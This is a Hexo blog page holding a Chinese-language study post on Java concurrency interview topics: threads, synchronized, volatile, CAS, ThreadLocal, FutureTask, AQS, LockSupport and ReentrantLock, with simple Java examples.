<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"songbaoru.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.15.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta property="og:type" content="website">
<meta property="og:title" content="SBR Blog">
<meta property="og:url" content="https://songbaoru.github.io/index.html">
<meta property="og:site_name" content="SBR Blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="SBR">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://songbaoru.github.io/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>SBR Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">SBR Blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
    </div>
  </div>
</div>







</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">SBR</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">10</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://songbaoru.github.io/2023/05/07/Java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="SBR">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SBR Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | SBR Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/05/07/Java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/" class="post-title-link" itemprop="url">Java并发编程</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2023-05-07 21:39:13" itemprop="dateCreated datePublished" datetime="2023-05-07T21:39:13+08:00">2023-05-07</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2023-05-11 22:30:37" itemprop="dateModified" datetime="2023-05-11T22:30:37+08:00">2023-05-11</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>Java 并发编程是 Java 面试中的一个重要部分，因为在现代多核处理器和高并发应用程序中，充分理解并发编程及其挑战非常关键。以下是一些 Java 并发编程的常见面试考点：</p>
<ol>
<li><p>Java 中的线程创建和管理：了解如何创建和管理线程，包括使用 <code>Thread</code> 类、<code>Runnable</code> 接口和 Java 8 中的 <code>CompletableFuture</code> 类。</p>
</li>
<li><p>线程同步：了解如何使用 <code>synchronized</code> 关键字、<code>ReentrantLock</code>、<code>Semaphore</code> 等同步原语来保证线程安全。</p>
</li>
<li><p>线程间通信：了解如何使用 <code>wait()</code>、<code>notify()</code> 和 <code>notifyAll()</code> 方法以及 <code>BlockingQueue</code>、<code>CountDownLatch</code>、<code>CyclicBarrier</code> 等机制进行线程间通信。</p>
</li>
<li><p>线程局部变量：了解 <code>ThreadLocal</code> 类的使用，它允许在不同线程中存储和访问线程独立的变量。</p>
</li>
<li><p>Java 内存模型：理解 Java 内存模型中的关键概念，如原子性、可见性和有序性，以及如何使用 <code>volatile</code> 关键字和原子操作类（如 <code>AtomicInteger</code>、<code>AtomicLong</code> 等）来确保并发安全。</p>
</li>
<li><p>线程池：了解 Java 中线程池的概念和用法，包括 <code>Executor</code>、<code>ExecutorService</code> 和 <code>ScheduledExecutorService</code> 接口，以及 <code>ThreadPoolExecutor</code> 和 <code>ForkJoinPool</code> 等具体实现。</p>
</li>
<li><p>并发集合：了解 Java 并发包中提供的线程安全集合类，如 <code>ConcurrentHashMap</code>、<code>CopyOnWriteArrayList</code>、<code>CopyOnWriteArraySet</code> 等。</p>
</li>
<li><p>并行流：了解 Java 8 中引入的并行流（Parallel Streams）概念，以及如何利用它进行数据并行处理。</p>
</li>
<li><p>CompletableFuture：了解 Java 8 引入的 <code>CompletableFuture</code> 类，它提供了异步编程、组合和转换操作的强大功能。</p>
</li>
<li><p>死锁、饥饿和活锁：理解死锁、饥饿和活锁的概念，以及如何检测和解决这些问题。</p>
</li>
</ol>
<p>这些是 Java 并发编程的一些关键考点，掌握它们将有助于面试过程中回答相关问题。同时，在实际项目中应用这些知识，能够更好地解决并发编程中可能遇到的问题。</p>
<p>以下是一些关于 Java 并发的面试常见问题：</p>
<ol>
<li><p>如何在 Java 中创建线程？</p>
</li>
<li><p>描述 <code>Runnable</code> 和 <code>Callable</code> 接口之间的区别。</p>
</li>
<li><p>什么是线程同步？解释 <code>synchronized</code> 关键字和 <code>ReentrantLock</code>。</p>
</li>
<li><p>什么是死锁？如何预防和解决死锁？</p>
</li>
<li><p>解释线程间通信的方法，例如 <code>wait()</code>、<code>notify()</code> 和 <code>notifyAll()</code>。</p>
</li>
<li><p>什么是线程池？如何在 Java 中创建和使用线程池？</p>
</li>
<li><p>描述 Java 中的 <code>Executor</code>、<code>ExecutorService</code> 和 <code>ScheduledExecutorService</code> 接口。</p>
</li>
<li><p>什么是 Java 内存模型？解释原子性、可见性和有序性。</p>
</li>
<li><p>什么是 <code>volatile</code> 关键字？它如何确保可见性和有序性？</p>
</li>
<li><p>解释 Java 中的原子操作类，如 <code>AtomicInteger</code>、<code>AtomicLong</code> 和 <code>AtomicReference</code>。</p>
</li>
<li><p>描述 Java 并发包中的线程安全集合类，如 <code>ConcurrentHashMap</code>、<code>CopyOnWriteArrayList</code> 和 <code>CopyOnWriteArraySet</code>。</p>
</li>
<li><p>什么是 Java 8 中的并行流（Parallel Streams）？如何使用它们？</p>
</li>
<li><p>解释 Java 8 中的 <code>CompletableFuture</code> 类及其用法。</p>
</li>
<li><p>描述线程饥饿和活锁问题，以及如何解决它们。</p>
</li>
<li><p>什么是 <code>ThreadLocal</code> 类？它如何在 Java 中使用？</p>
</li>
</ol>
<p>这些问题涵盖了 Java 并发编程的各个方面。为了在面试中表现出色，请确保熟悉这些问题并准备好清晰、简洁的答案。同时，在实际项目中应用这些知识，能够更好地解决并发编程中可能遇到的问题。</p>
<h1 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h1><p>线程可以通俗的理解为程序不同的执行路径</p>
<h2 id="创建线程"><a href="#创建线程" class="headerlink" title="创建线程"></a>创建线程</h2><ul>
<li>继承Thread类</li>
<li>定义一个类实现Runnable接口</li>
<li>使用Callable和Future创建线程</li>
<li>通过线程池创建线程</li>
</ul>
<p>线程状态</p>
<p>线程同步</p>
<h2 id="线程间通信"><a href="#线程间通信" class="headerlink" title="线程间通信"></a>线程间通信</h2><h2 id="线程局部变量"><a href="#线程局部变量" class="headerlink" title="线程局部变量"></a>线程局部变量</h2><p>线程池</p>
<p>线程顺序执行控制<br>高频面试加分项<br>JDK13&#x2F;14的改变<br>纤程<br>Quasar类库的使用</p>
<p>在Java和许多其他编程语言中，线程的<code>sleep()</code>方法并不会导致线程释放锁，但是不会阻塞其他线程。</p>
<p>当一个线程调用<code>sleep()</code>方法时，它会使线程进入阻塞状态一段时间，但该线程仍然保有它已经获得的所有锁。这意味着如果一个线程在进入<code>sleep()</code>之前获得了一个锁，那么它在<code>sleep()</code>期间仍然会保持这个锁，其他线程无法获得这个锁。</p>
<p>这与线程的<code>wait()</code>方法不同。当一个线程调用<code>wait()</code>方法时，它会释放它在相应对象上的锁，允许其他线程获得这个锁。</p>
<p>这是因为<code>sleep()</code>和<code>wait()</code>方法的设计目标不同：<code>sleep()</code>方法主要用于让线程暂停一段时间，而<code>wait()</code>方法主要用于实现线程间的同步。所以，在编写多线程程序时，需要根据实际的需求和情况选择合适的方法。</p>
<h2 id="超线程"><a href="#超线程" class="headerlink" title="超线程"></a>超线程</h2><p>超线程（Hyper-Threading）是Intel公司引入的一种处理器（CPU）技术。这项技术的主要目标是提高处理器核心的效率和性能。超线程通过使单个处理器核心模拟出两个“逻辑”核心，以便同时处理两个线程，从而提高了处理器的并行处理能力。</p>
<p>传统的单核心处理器在任何时刻只能处理一个线程。但是，由于各种原因（例如，等待数据从内存中加载），处理器可能无法始终保持忙碌状态。在这些情况下，处理器的一部分（例如，算术逻辑单元或浮点单元）可能会闲置，从而造成资源浪费。</p>
<p>超线程技术试图解决这个问题，通过在单个核心上同时运行两个线程，使得当一个线程在等待时，另一个线程可以使用处理器的资源进行计算。因此，超线程可以使处理器在相同的时间内完成更多的工作，从而提高处理器的整体效率和性能。</p>
<p>然而，超线程并不总是能提供显著的性能提升。在某些情况下，如果两个线程需要使用相同的处理器资源，那么它们可能会相互竞争，从而导致性能下降。此外，超线程对于多线程程序或多任务环境最有效，对于单线程程序或单任务环境的效果可能不明显。</p>
<p>请注意，虽然超线程可以提高处理器的并行处理能力，但它并不能取代多核处理器。多核处理器具有多个独立的物理核心，每个核心都可以处理自己的线程，因此它们通常可以提供比超线程更好的并行性和性能。</p>
<h1 id="CAS"><a href="#CAS" class="headerlink" title="CAS"></a>CAS</h1><h2 id="CAS底层实现"><a href="#CAS底层实现" class="headerlink" title="CAS底层实现"></a>CAS底层实现</h2><p>使用的操作系统原语是lock cmpxchg</p>
<h1 id="Java内存模型"><a href="#Java内存模型" class="headerlink" title="Java内存模型"></a>Java内存模型</h1><p>原子性</p>
<p>可见性</p>
<p>有序性</p>
<p>进程：CPU分配资源的基本单位</p>
<p>线程：CPU执行的基本单位</p>
<p>缓存行对齐 – Disruptor就应用了缓存行对齐技术提高了数据修改效率</p>
<h2 id="对象内存模型"><a href="#对象内存模型" class="headerlink" title="对象内存模型"></a>对象内存模型</h2><h1 id="synchronized"><a href="#synchronized" class="headerlink" title="synchronized"></a>synchronized</h1><h2 id="synchronized底层实现"><a href="#synchronized底层实现" class="headerlink" title="synchronized底层实现"></a>synchronized底层实现</h2><ol>
<li>Java代码层面：使用synchronized关键字</li>
<li>字节码层面：monitorenter、monitorexit</li>
<li>执行层面：锁升级（偏向锁、自旋锁、重量级锁）</li>
<li>操作系统层面：使用的操作系统原语是lock cmpxchg</li>
</ol>
<p>synchronized是可重入的，一个原因是，如果synchronized是不可重入的，那么当一个方法调用另一个需要同一把锁的方法（被调用方法）时，被调用方法等待发起调用的方法释放锁，发起调用的方法等待被调用方法的执行，会产生死锁。</p>
<p>程序中如果出现异常，默认情况下锁会被释放，可能会导致数据不一致的情况发生，如果不想释放，可以加catch捕获异常</p>
<h2 id="锁升级"><a href="#锁升级" class="headerlink" title="锁升级"></a>锁升级</h2><ol>
<li><p>无锁</p>
</li>
<li><p>偏向锁</p>
</li>
<li><p>自旋锁（如果发生线程争用，就由偏向锁升级为自旋锁，如果超过默认自旋次数上限，默认是10次，就会升级为重量级锁）</p>
</li>
<li><p>重量级锁（重量级锁下线程等待不占用CPU）</p>
</li>
</ol>
<p>自旋锁效率比重量级锁高的条件：同步代码块执行时间短、等待线程数少</p>
<h2 id="操作系统的互斥量"><a href="#操作系统的互斥量" class="headerlink" title="操作系统的互斥量"></a>操作系统的互斥量</h2><h2 id="用户态、内核态"><a href="#用户态、内核态" class="headerlink" title="用户态、内核态"></a>用户态、内核态</h2><h2 id="锁消除"><a href="#锁消除" class="headerlink" title="锁消除"></a>锁消除</h2><h2 id="锁粗化"><a href="#锁粗化" class="headerlink" title="锁粗化"></a>锁粗化</h2><h1 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h1><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul>
<li>保证可见性：Volatile变量在线程内存中被修改之后要立即同步回主内存中，以保证其他线程使用该volatile关键字修饰的变量时获取到的是最新的变量值。Volatile可以保证每次线程从主内存中刷新到最新的变量值。</li>
<li>禁止指令重排序优化（内存屏障，也会牺牲掉一些性能）</li>
</ul>
<p>不支持原子性，非线程安全：对一个volatile修饰的变量的读写操作不是原子性的。因为如果在第一个线程加载某个volatile修饰的变量值到工作内存之后有其他线程修改了这个变量值，那么第一个线程是感知不到这个值的变化的。这个时候就会出现线程安全的问题，所以为了保证线程安全问题还是需要synchronized关键字。</p>
<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><ol>
<li>运算结果不依赖于变量的当前值或者能够确保只有一个线程修改这个变量的值；</li>
<li>变量不需要与其他的状态变量共同参与不变约束。</li>
</ol>
<h2 id="Java内存模型对volatile变量定义的特殊规则"><a href="#Java内存模型对volatile变量定义的特殊规则" class="headerlink" title="Java内存模型对volatile变量定义的特殊规则"></a>Java内存模型对volatile变量定义的特殊规则</h2><ul>
<li>在工作内存中每次使用变量前都需要从主内存中刷新最新值；</li>
<li>每次修改变量的值之后都必须立刻同步到主内存中；</li>
<li>要求volatile修饰的变量不会被指令重新排序。</li>
</ul>
<h2 id="volatile底层实现"><a href="#volatile底层实现" class="headerlink" title="volatile底层实现"></a>volatile底层实现</h2><ul>
<li>保证可见性：缓存一致性</li>
<li>禁止指令重排序优化：内存屏障</li>
</ul>
<h2 id="DCL单例"><a href="#DCL单例" class="headerlink" title="DCL单例"></a>DCL单例</h2><p>DCL（Double Check Lock）单例为什么需要加volatile？</p>
<p>如果不加volatile，不能避免指令重排序，初始化指令和堆栈建立连接的指令可能会倒换，即可能出现堆栈建立连接发生在初始化指令之前，即</p>
<ul>
<li>加volatile，没有被重排序的指令执行过程如下<ol>
<li>初始化指令</li>
<li>堆栈建立连接的指令</li>
</ol>
</li>
<li>不加volatile，可能出现的重排序的指令执行过程如下<ul>
<li>堆栈建立连接的指令</li>
<li>初始化指令</li>
</ul>
</li>
</ul>
<p>这就导致在多线程环境下，如果没有使用volatile，假如一个线程正在使用创建对象，并且发生了指令重排序，使得堆栈建立连接的指令发生在初始化指令之前，那么当这条线程恰好执行完堆栈建立连接的指令，还没有执行初始化指令时，有一个新的线程线程执行DCL单例的函数，判断得到栈中已经指向堆中已有的对象，就会执行返回此对象，而此时对象还没有被初始化，此时获取的对象的值仅仅是默认值而不是初始化的值。</p>
<h1 id="ThreadLocal"><a href="#ThreadLocal" class="headerlink" title="ThreadLocal"></a>ThreadLocal</h1><p><code>ThreadLocal</code>由一个线程的类型为<code>ThreadLocal.ThreadLocalMap</code>的对象threadlocals来保存。具体来说，在<code>ThreadLocalMap</code>中，set到<code>ThreadLocal</code>对象的值作为值（value），<code>ThreadLocal</code>对象作为键（key），并且key是一个弱引用。</p>
<h1 id="ThreadPool"><a href="#ThreadPool" class="headerlink" title="ThreadPool"></a>ThreadPool</h1><h1 id="FutureTask"><a href="#FutureTask" class="headerlink" title="FutureTask"></a>FutureTask</h1><p><code>FutureTask</code>是Java并发包<code>java.util.concurrent</code>中的一个类，它实现了<code>RunnableFuture</code>接口，<code>RunnableFuture</code>接口同时继承了<code>Runnable</code>接口和<code>Future</code>接口。</p>
<p><code>FutureTask</code>类的主要作用是用来表示一个可以产生结果的计算任务。你可以将这个任务提交给<code>ExecutorService</code>去执行，也可以直接在你的线程中执行它。当任务执行完毕后，你可以通过调用<code>FutureTask.get()</code>方法来获取计算的结果。</p>
<p>以下是使用<code>FutureTask</code>的一个简单示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Callable&lt;Integer&gt; task = <span class="keyword">new</span> <span class="title class_">Callable</span>&lt;Integer&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 这里是你的计算任务</span></span><br><span class="line">        <span class="keyword">return</span> doSomeLongTimeComputation();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">FutureTask&lt;Integer&gt; futureTask = <span class="keyword">new</span> <span class="title class_">FutureTask</span>&lt;&gt;(task);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将任务提交给线程池</span></span><br><span class="line"><span class="type">ExecutorService</span> <span class="variable">executor</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">1</span>);</span><br><span class="line">executor.execute(futureTask);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在你需要结果的时候调用get()方法获取</span></span><br><span class="line"><span class="comment">// 注意：如果任务还没有完成，get()方法会阻塞，直到任务完成为止</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">result</span> <span class="operator">=</span> futureTask.get();</span><br></pre></td></tr></table></figure>

<p>这里的关键是<code>Callable</code>接口和<code>Future</code>接口。<code>Callable</code>接口表示一个可以返回结果的任务，而<code>Future</code>接口表示一个异步计算的结果。<code>FutureTask</code>就是这两个接口的一个实现，它既可以作为一个任务（<code>Runnable</code>）被线程执行，也可以作为一个结果（<code>Future</code>）被线程获取。</p>
<h1 id="并发集合"><a href="#并发集合" class="headerlink" title="并发集合"></a>并发集合</h1><h1 id="同步容器"><a href="#同步容器" class="headerlink" title="同步容器"></a>同步容器</h1><p>同步容器类的演变<br>Map&#x2F;Set从无锁到同步<br>ArrayList<br>LinkedList<br>Collections.synchronizedXXX<br>CopyOnWriteList<br>队列<br>ConcurrentLinkedQueue<br>ConcurrentArrayQueue<br>LinkedBlockingQueue<br>Queue<br>ArrayBlockingQueue<br>TransferQueue<br>SynchronousQueue<br>DelayQueue</p>
<h1 id="并发工具类"><a href="#并发工具类" class="headerlink" title="并发工具类"></a>并发工具类</h1><h2 id="AQS"><a href="#AQS" class="headerlink" title="AQS"></a>AQS</h2><p>AQS（AbstractQueuedSynchronizer）是volatile和CAS和队列的组合应用</p>
<p>java中哪些同步锁是基于AQS实现的：</p>
<p>Java 并发包 <code>java.util.concurrent</code> 中的许多同步工具类都是基于 <code>AbstractQueuedSynchronizer</code> (简称 AQS) 来实现的。AQS 是一个用于构建锁和同步器的框架，它使用一个 int 成员变量来表示同步状态，并提供了一种使用 CAS（Compare-and-Swap）设置同步状态的方式。以下是一些基于 AQS 实现的同步类：</p>
<ol>
<li><p><strong>ReentrantLock</strong>：重入锁，是一种互斥锁，它的特点是支持重入功能，也就是说，一个线程能够对已经获取到的锁再次获取，而不会发生死锁。</p>
</li>
<li><p><strong>ReentrantReadWriteLock</strong>：读写锁，它分为两个锁，一个是读锁，一个是写锁。多个读锁之间不会互斥，读锁与写锁互斥，写锁与写锁互斥。这是由jvm自己控制的，你只要上好相应的锁即可。</p>
</li>
<li><p><strong>Semaphore</strong>：信号量，内部维护了一组”许可”，线程可以申请许可（如果无可用许可则阻塞），也可以释放许可。信号量可用于实现资源池，或者对某个操作的并发线程数进行限制。</p>
</li>
<li><p><strong>CountDownLatch</strong>：倒计时门栓，它可以让一个或多个线程等待其他线程完成各自的工作后再执行。</p>
</li>
<li><p><strong>CyclicBarrier</strong>：循环栅栏，它允许一组线程互相等待，直到所有的线程都准备就绪后，所有的线程才能继续执行。</p>
</li>
<li><p><strong>FutureTask</strong>：一个实现了 <code>Future</code> 和 <code>Runnable</code> 接口的类，可以用来执行 <code>Callable</code> 任务，并且可以获取任务执行后的结果。</p>
</li>
</ol>
<p>这些类都通过自定义 AQS 来实现它们自己的同步语义。</p>
<h2 id="LockSupport"><a href="#LockSupport" class="headerlink" title="LockSupport"></a>LockSupport</h2><p><code>LockSupport</code>是Java并发编程中一个非常有用的工具类，它位于<code>java.util.concurrent.locks</code>包中。<code>LockSupport</code>提供了一种基于线程的，低层次的线程阻塞和唤醒机制。</p>
<p>AQS 底层使用了<code>LockSupport</code>来实现线程的阻塞和唤醒</p>
<p>在底层实现上，<code>LockSupport</code>使用了一种名为”许可（Permit）”的概念来控制阻塞和唤醒。许可的数量最多为1，如果线程已经拿到了许可，则调用<code>LockSupport.park()</code>会立即返回；如果没有拿到许可，<code>park()</code>方法会阻塞线程。调用<code>LockSupport.unpark(Thread)</code>方法会给指定的线程发放许可。</p>
<p>下面是一个简单的<code>LockSupport</code>使用例子：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LockSupportExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Child thread begin park!&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用park方法，挂起自己</span></span><br><span class="line">            LockSupport.park();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;Child thread end park!&quot;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        thread.start();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 主线程延迟2s</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Main thread begin unpark!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用unpark方法让thread线程持有许可证，然后park方法返回</span></span><br><span class="line">        LockSupport.unpark(thread);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，子线程通过调用<code>LockSupport.park()</code>方法阻塞自己，主线程在延迟2秒后调用<code>LockSupport.unpark(thread)</code>方法唤醒子线程。</p>
<p>需要注意的是，<code>LockSupport.park()</code>方法不会响应中断，并且不会抛出<code>InterruptedException</code>。如果线程在调用<code>park()</code>方法时被中断，或者在调用<code>park()</code>方法之前已经被中断，那么调用<code>park()</code>方法会立即返回，但是不会清除线程的中断标记。你可以通过<code>Thread.interrupted()</code>方法来检查和清除线程的中断标记。</p>
<p>unpark()可以先于park()调用：</p>
<p><code>LockSupport.unpark(thread)</code> 可以在 <code>LockSupport.park()</code> 之前调用。实际上，这是 <code>LockSupport</code> 的一个特性，即“许可”机制。</p>
<p><code>LockSupport</code> 的工作原理是，每个线程都有一个许可（permit），许可的数量最多为1。如果线程已经拿到了许可，那么调用 <code>LockSupport.park()</code> 会立即返回；如果没有许可，那么 <code>park()</code> 方法会阻塞线程。调用 <code>LockSupport.unpark(Thread)</code> 方法会给指定的线程发放许可。</p>
<p>因此，如果 <code>unpark(thread)</code> 在 <code>park()</code> 之前被调用，那么线程会获得一个许可，当后续 <code>park()</code> 被调用时，线程可以立即消费掉这个许可并继续执行，而不会阻塞。</p>
<p>这种机制使得 <code>unpark</code> 方法可以在 <code>park</code> 方法之前调用，线程仍然能够正确地阻塞和唤醒。</p>
<p>java中哪些同步锁是基于LockSupport实现的：</p>
<p>Java中许多的同步类底层使用了<code>LockSupport</code>来实现线程的阻塞和唤醒。最主要的类就是<code>AbstractQueuedSynchronizer</code>（简称AQS），它是许多同步类的基础框架。以下是一些基于AQS，从而间接使用<code>LockSupport</code>实现的同步类：</p>
<ol>
<li><p><strong>ReentrantLock</strong>：重入锁，是一个互斥锁，支持重入功能，也就是说，一个线程能够对已经获取到的锁再次获取，而不会发生死锁。</p>
</li>
<li><p><strong>ReentrantReadWriteLock</strong>：读写锁，它分为两个锁，一个是读锁，一个是写锁。多个读锁之间不会互斥，读锁与写锁互斥，写锁与写锁互斥。</p>
</li>
<li><p><strong>Semaphore</strong>：信号量，内部维护了一组”许可”，线程可以申请许可（如果无可用许可则阻塞），也可以释放许可。</p>
</li>
<li><p><strong>CountDownLatch</strong>：倒计时门栓，它可以让一个或多个线程等待其他线程完成各自的工作后再执行。</p>
</li>
<li><p><strong>CyclicBarrier</strong>：循环栅栏，它允许一组线程互相等待，直到所有的线程都准备就绪后，所有的线程才能继续执行。</p>
</li>
<li><p><strong>FutureTask</strong>：实现了<code>Future</code>和<code>Runnable</code>接口的类，可以用来执行<code>Callable</code>任务，并且可以获取任务执行后的结果。</p>
</li>
</ol>
<p>所有这些类都通过使用<code>LockSupport.park()</code>和<code>LockSupport.unpark(Thread)</code>方法来阻塞和唤醒线程。</p>
<h1 id="JUC同步锁"><a href="#JUC同步锁" class="headerlink" title="JUC同步锁"></a>JUC同步锁</h1><p>以下的锁当中除了LockSupport之外，其他的都是基于AQS实现的</p>
<h2 id="ReentrantLock"><a href="#ReentrantLock" class="headerlink" title="ReentrantLock"></a>ReentrantLock</h2><p>ReentrantLock是Java并发包<code>java.util.concurrent.locks</code>中的一个类，ReentrantLock是可重入锁，每获取一次，重入的计数就会增加1。当线程释放锁时，重入的计数就会减少1。只有当重入的计数变为0时，锁才会真正被释放。</p>
<p><code>ReentrantLock</code>是基于Java的<code>AbstractQueuedSynchronizer</code>(AQS)框架实现的。AQS使用一个整数值来表示锁的状态，并使用一个FIFO队列来管理等待的线程。ReentrantLock底层使用的是锁的park()和unpark()</p>
<p>要使用<code>ReentrantLock</code>，需要创建一个<code>ReentrantLock</code>的实例，然后在需要互斥访问的代码前调用<code>lock()</code>方法，代码后调用<code>unlock()</code>方法。为了确保锁可以被正确释放，通常需要将<code>unlock()</code>方法放在<code>finally</code>块中。下面是一个例子：</p>
